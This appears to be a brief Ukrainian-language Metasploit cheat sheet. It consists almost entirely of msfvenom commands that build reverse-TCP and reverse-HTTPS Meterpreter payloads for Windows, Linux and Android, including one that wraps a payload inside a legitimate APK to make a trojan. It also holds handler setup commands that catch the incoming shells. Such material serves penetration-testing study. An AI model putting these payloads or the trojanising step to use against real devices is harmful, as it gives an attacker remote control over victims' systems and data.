Генерація payload'ів для платформ

Windows

# EXE msfvenom -p windows/ meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o payload.exe # HTTPS msfvenom -p windows/ meterpreter/reverse_https LHOST=192.168.1.50 LPORT=443 -f exe -o pay_https.exe

Linux

# ELF msfvenom -p linux/x86/ meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o payload.elf chmod +x payload.elf

Android

# APK msfvenom -p android/ meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -o evil.apk # З шаблоном msfvenom ... -x legit.apk -o trojan.apk

Multi/Handler та доставка

Налаштування handler

msf6> use exploit/multi/handler msf6> set PAYLOAD windows/meterpreter/reverse_tcp msf6> set LHOST 0.0.0.0 msf6> set LPORT 4444 msf6> set ExitOnSession false # кілька підключень msf6> exploit -j # фоновий режим [*] Started reverse TCP handler on 0.0.0.0:4444 [*] Meterpreter session 1 opened
